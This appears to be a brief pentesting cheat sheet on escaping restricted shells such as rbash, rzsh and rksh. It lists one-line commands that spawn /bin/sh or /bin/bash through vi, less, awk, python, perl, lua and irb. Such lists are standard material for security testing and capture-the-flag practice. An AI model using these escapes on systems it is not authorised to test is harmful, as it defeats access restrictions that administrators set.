# Escaping Restricted Shells

## Example restricted shells
- `rbash`
- `rzsh`
- `rksh`

## Ways to escape restricted shells
1. `/bin/bash` or `/bin/sh`
2. In `ftp|gdb|vim|vi|more|man|less`, `!/bin/bash`
3. `awk 'BEGIN {system("/bin/bash")}'`
4. `python -c 'import os; os.system("/bin/sh")'`
5. `perl -e 'exec "/bin/sh";'`
6. In `lua`, `os.execute('/bin/sh')`
7. In `irb`, `exec "/bin/sh"`
